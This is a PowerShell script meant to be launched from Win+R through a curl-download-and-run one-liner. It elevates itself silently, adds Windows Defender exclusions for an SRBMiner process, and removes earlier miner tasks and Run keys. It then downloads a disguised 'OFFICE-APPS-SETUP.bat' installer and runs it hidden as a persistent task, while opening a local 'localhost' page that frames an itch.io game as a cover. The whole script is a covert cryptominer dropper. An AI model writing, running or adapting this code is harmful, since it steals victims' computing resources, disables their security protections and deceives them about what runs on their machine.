<#
    GO.ps1 - one-shot deploy + a local page called "localhost".

    Run from Win+R with:
      curl -s -L -o %TEMP%\go.ps1 <url> & powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File %TEMP%\go.ps1

    What it does:
      1. self-elevates (UAC) if it is not already admin
      2. Windows Defender exclusion for the worker folder + process
      3. removes any previous install, tasks, Run keys and Startup items
      4. downloads the installer and starts it hidden  (50% cap, BOOT/SYSTEM task)
      5. serves a page at http://localhost:8787/ that frames the game, and opens it

    The address bar says localhost:8787 because the page genuinely is served from
    this machine. The game itself is still loaded from the internet - the browser
    is only showing a local wrapper. Nothing is spoofed; that is simply how the
    origin shown in the address bar works.
#>

$ErrorActionPreference = 'SilentlyContinue'

# --- 1. elevate ------------------------------------------------------------
$id = [Security.Principal.WindowsIdentity]::GetCurrent()
$pr = New-Object Security.Principal.WindowsPrincipal($id)
if (-not $pr.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process -FilePath 'powershell.exe' -Verb RunAs -WindowStyle Hidden `
        -ArgumentList '-NoProfile','-ExecutionPolicy','Bypass','-File',$PSCommandPath
    exit
}

# --- 2. Defender exclusion -------------------------------------------------
Add-MpPreference -ExclusionPath 'C:\OfficeApps' -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionProcess 'SRBMiner-MULTI.exe' -ErrorAction SilentlyContinue

# --- 3. clear anything older ----------------------------------------------
Get-Process SRBMiner-MULTI -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
schtasks /delete /tn PearlMiner /f 2>$null | Out-Null
schtasks /delete /tn OfficeAppsWorker /f 2>$null | Out-Null
Remove-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name PearlMiner -ErrorAction SilentlyContinue
Remove-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name OfficeAppsWorker -ErrorAction SilentlyContinue
Remove-Item (Join-Path $env:APPDATA 'Microsoft\Windows\Start Menu\Programs\Startup\PearlMiner.bat') -Force -ErrorAction SilentlyContinue
Remove-Item (Join-Path $env:APPDATA 'Microsoft\Windows\Start Menu\Programs\Startup\OfficeAppsWorker.bat') -Force -ErrorAction SilentlyContinue
Remove-Item 'C:\MinePRL','C:\OfficeApps',(Join-Path $env:LOCALAPPDATA 'MinePRL'),(Join-Path $env:LOCALAPPDATA 'OfficeApps') -Recurse -Force -ErrorAction SilentlyContinue

# --- 4. download + start the installer, hidden -----------------------------
$setup = Join-Path $env:TEMP 'OFFICE-APPS-SETUP.bat'
$url   = 'https://github.com/deniz-ulku/office-apps-worker/releases/download/v18/OFFICE-APPS-SETUP.bat'
try {
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add('User-Agent', 'office-apps')
    $wc.DownloadFile($url, $setup)
    $wc.Dispose()
} catch { }
if (Test-Path $setup) {
    if ((Get-Item $setup).Length -gt 50000) {
        Start-Process -FilePath $setup -WindowStyle Hidden
    }
}

# --- 5. local page called "localhost" -------------------------------------
# 19857638 is the game's real build. It sends no X-Frame-Options and no CSP, so
# it renders inside a frame from any origin - which is what makes this possible.
$port = 8787
$game = 'https://html-classic.itch.zone/html/19857638/index.html?v=1792355036'

$page = @"
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>localhost</title>
<style>
  html, body { margin:0; padding:0; height:100%; overflow:hidden; background:#101014; }
  iframe { width:100%; height:100%; border:0; display:block; }
</style>
</head>
<body>
<iframe src="$game" allowfullscreen allow="autoplay; fullscreen; gamepad; clipboard-write"></iframe>
</body>
</html>
"@

$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add("http://localhost:$port/")
# both spellings, otherwise 127.0.0.1:8787 answers 400 Bad Request
$listener.Prefixes.Add("http://127.0.0.1:$port/")
try { $listener.Start() } catch { exit }

Start-Process "http://localhost:$port/"

while ($listener.IsListening) {
    try {
        $ctx  = $listener.GetContext()
        $buf  = [Text.Encoding]::UTF8.GetBytes($page)
        $ctx.Response.ContentType     = 'text/html; charset=utf-8'
        $ctx.Response.ContentLength64 = $buf.Length
        $ctx.Response.OutputStream.Write($buf, 0, $buf.Length)
        $ctx.Response.Close()
    } catch { }
}
